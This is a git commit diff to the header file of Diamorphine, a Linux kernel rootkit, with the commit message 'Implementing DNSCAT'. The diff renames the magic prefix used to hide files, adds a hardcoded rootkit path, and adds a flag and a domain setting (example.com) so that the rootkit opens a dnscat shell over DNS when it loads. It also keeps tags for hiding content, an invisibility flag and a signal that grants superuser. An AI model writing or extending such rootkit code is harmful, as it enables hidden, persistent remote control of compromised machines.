7d40366452be000843ff3e3564afff807cb6e0e2
Matheus <111313155+v3nv4ns3s@users.noreply.github.com>
2023-02-11 19:28:53 -0300

    Implementing DNSCAT in a very ugly but functional way

--- diamorphine.h
+++ diamorphine.h
@@ -6,17 +6,17 @@ struct linux_dirent {
 };
 
 #define SSIZE_MAX 32767
-#define MAGIC_PREFIX "diamorphine_secret"
+#define MAGIC_PREFIX "new_diamorphine"
+#define RK_PATH "/home/ad_astra/new_diamorphine/" 
 #define HIDETAGIN "<viajano>"
 #define HIDETAGOUT "</viajano>"
 #define PF_INVISIBLE 0x10000000
+#define DNSCATSHELL 1 // only if you want the RK to send a dnscat shell when initiated 
+char *domain = "example.com"; // only if you want the RK to send a dnscat shell when initiated 
 int file_check(void *arg, ssize_t size);
 int hide_content(void *arg, ssize_t size);
 atomic_t read_on;
 #define MODULE_NAME "diamorphine"
-
-char buffer[PAGE_SIZE];
-
 enum {
 	SIGINVIS = 31,
 	SIGSUPER = 64,
